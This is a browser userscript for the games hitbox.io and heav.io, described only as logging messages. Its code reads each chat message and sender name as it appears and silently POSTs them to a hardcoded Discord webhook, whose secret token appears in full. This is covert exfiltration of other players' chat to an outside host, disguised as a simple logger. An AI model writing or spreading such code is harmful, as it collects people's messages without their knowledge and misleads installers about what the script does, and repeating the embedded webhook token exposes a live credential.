// ==UserScript==
// @name         Msg Logs
// @namespace    http://tampermonkey.net/
// @version      1.0.0
// @description  log mesage
// @author       CarManiac
// @run-at       document-idle
// @license      MIT
// @match        https://heav.io/game.html
// @match        https://hitbox.io/game.html
// @match        https://heav.io/game2.html
// @match        https://hitbox.io/game2.html
// @match        https://hitbox.io/game-beta.html
// @icon         https://www.google.com/s2/favicons?sz=64&domain=heav.io
// @icon         https://www.google.com/s2/favicons?sz=64&domain=hitbox.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/548530/Msg%20Logs.user.js
// @updateURL https://update.greasyfork.org/scripts/548530/Msg%20Logs.meta.js
// ==/UserScript==
(function() {
    'use strict';
const observer = new MutationObserver((e) => {
    // console.log(e);
    for (let i of e) {
        if (i.addedNodes) {
            for (let x of i.addedNodes) {
                if (x && x.classList && x.classList.contains('messageContainer')) {
                    let text = x.querySelector("span.message").textContent;
                    let user = x.querySelector("span.name").textContent;
                    fetch('https://discord.com/api/webhooks/1314017410646540390/qJqM_DPf4zyymreObJYQ33t-Mgv2IPIxFCWjXbiPxFHZ-zFV5fLVAcCVyFlJDxUzZFr8',{
                        "body": JSON.stringify({
                            username: user,
                            content: text
                        }),
                        "headers": {
                            "accept": "application/json",
                            "accept-language": "en",
                            "content-type": "application/json",
                        },
                        "method": "POST"
                    })
                    console.log(user,text);
                }
            }
        }
    }
});

observer.observe(document.body, { childList: true, subtree: true });
})();